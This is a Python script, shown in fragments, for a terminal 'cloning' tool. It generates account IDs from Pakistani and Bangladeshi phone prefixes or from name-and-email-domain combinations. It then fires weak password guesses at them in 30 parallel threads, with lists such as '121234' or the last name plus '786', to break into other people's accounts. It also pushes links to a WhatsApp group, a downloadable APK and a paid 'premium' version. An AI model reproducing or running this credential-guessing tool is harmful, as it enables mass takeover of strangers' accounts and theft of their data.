...
\033[1;92m║\033[1;97m[+] WHATSAPP   : \033[1;92m+8801788953189       ║
\033[1;92m║\033[1;97m[+] GITHUB     : \033[1;92mMAHIN-71             ║
\033[1;92m║\033[1;97m[+] VERTION    : \033[1;92m1.3                  ║
\033[1;91m╚══════════════════════════════════════╝""")
def linex():
        print('\033[1;92m════════════════════════════════════════')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        xd=input(' \033[1;97mCHOOSE AN OPTION: ')
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;97mPut file example:  /sdcard/mahin.txt  ')
                                linex()
                                file = input(' \033[1;97m File Path\033[1;37m: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' \033[1;97m ALL METHOD WORKING  ')
                                linex()
                                print(' \033[1;97m[1] Method NEW ID  \n \033[1;97m[2] Method OLD ID ')
                                linex()
                                mthd=input(' \033[1;97mChoose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' \033[1;97mHow many passwords do you want to add : '))
                                except:
                                        ps_limit =1
                                clear()
                                print('\033[1;92m════════════════════════════════════════')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;92m════════════════════════════════════════')
                                        print('\033[1;97m [+] TOTAL ACCOUNT : \033[1;91m'+total_ids+f' ')
                                        print('\033[1;97m [+] PROCESS HAS BEEN STARTED')
                                        print('\033[1;97m [+] TO STOP PROCESS Ctrl + Z ')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                ...
                                clear()
                                print('\033[1;92m════════════════════════════════════════')
                                print(' \033[1;97m[1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/Iwto8kUxcbFK4EuifbillQ');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MAHIN_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://youtube.com/@mhmahin8427');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi MAHIN Sir, I Need To Buy Your Paid MAHIN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python mh.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                clear()
                print('\033[1;92m════════════════════════════════════════')
                print('\033[1;37m Code example: 0306,0315,0335,0345')
                print('\033[1;92m════════════════════════════════════════')
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MAHIN:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;92m════════════════════════════════════════')
                        print(' \033[1;97mTotal account : \033[1;32m'+tl)
                        print(f' \033[1;37mChoice code   :\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208m\033[1;97mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                clear()
                print('\033[1;92m════════════════════════════════════════')
                print('\033[1;37m Code example: 016,017,018,019')
                print('\033[1;92m════════════════════════════════════════')
                code = input('\033[1;37m put code: ')
                try:
                        print('\033[1;92m════════════════════════════════════════')
                ...
                with tred(max_workers=30) as MAHIN:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'121234','113355','@@@@####']
                                MAHIN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def gmail():
                ...
                clear()
                print('\033[1;92m════════════════════════════════════════')
                print(' \033[1;37mexample: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' \033[1;97mPut first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' \033[1;97mPut last name: ')
                linex()
                print(' \033[1;97mExample: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' \033[1;97mdomain: ')
                linex()
                try:
                        limit=int(input(' \033[1;97mPut limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' \033[1;97mGetting gmails...')
                lists = ['3','4']
                ...
                with tred(max_workers=30) as MAHIN:
                        ...
                        clear()
                        print('\033[1;92m════════════════════════════════════════')
                        print(' \033[1;97mTotal account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208m \033[1;97mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                ...
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,ls+'123',ls+'12345',ls+'1122',ls,ls+'1234',ls+'786',ls+'12']
                                MAHIN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
